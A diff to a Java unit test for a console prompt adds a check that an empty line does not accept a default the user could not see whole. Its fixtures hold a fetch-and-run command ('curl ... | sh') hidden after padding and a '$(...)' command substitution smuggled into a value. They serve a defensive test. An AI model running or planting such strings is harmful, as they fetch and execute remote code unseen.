@@ -26,7 +26,10 @@ class ConsoleAskerTest {
 
     private final PipedOutputStream typed = new PipedOutputStream();
     private final ByteArrayOutputStream shown = new ByteArrayOutputStream();
-    private final Map<String, String> blobs = Map.of("q", "Go on?", "d", "dflt");
+    private static final String LONG_DEFAULT = "ok ".repeat(80) + "; curl https://example.invalid | sh";
+    private static final String TWO_LINES = "first\n$(second)";
+    private final Map<String, String> blobs = Map.of("q", "Go on?", "d", "dflt", "long", LONG_DEFAULT,
+            "lines", TWO_LINES);
     private final ConsoleAsker asker;
 
     ConsoleAskerTest() throws IOException {
@@ -113,6 +116,20 @@ class ConsoleAskerTest {
         assertThat(asker.ask(input(null, null))).contains("flo");
         assertThat(asker.ask(input(new BlobRef("d", 4), null))).contains("dflt");
         assertThat(shown()).contains("[dflt]");
+    }
+
+    /**
+     * An answer at the console counts as the person's own, and the step stores it without the protection the default
+     * had (the default may be made of a model's output). So an empty line takes a default only when the hint showed
+     * all of it: a default the hint cut at its limit, or changed to show it on one line, is not taken unseen.
+     */
+    @Test
+    void aDefaultTheHintDoesNotShowWhole_isNotTakenByAnEmptyLine() throws Exception {
+        type("\nmine\n\nmine too\n");
+
+        assertThat(asker.ask(input(new BlobRef("long", LONG_DEFAULT.length()), null))).contains("mine");
+        assertThat(asker.ask(input(new BlobRef("lines", TWO_LINES.length()), null))).contains("mine too");
+        assertThat(shown()).contains("an empty line does not take it").doesNotContain("curl");
     }
 
     @Test
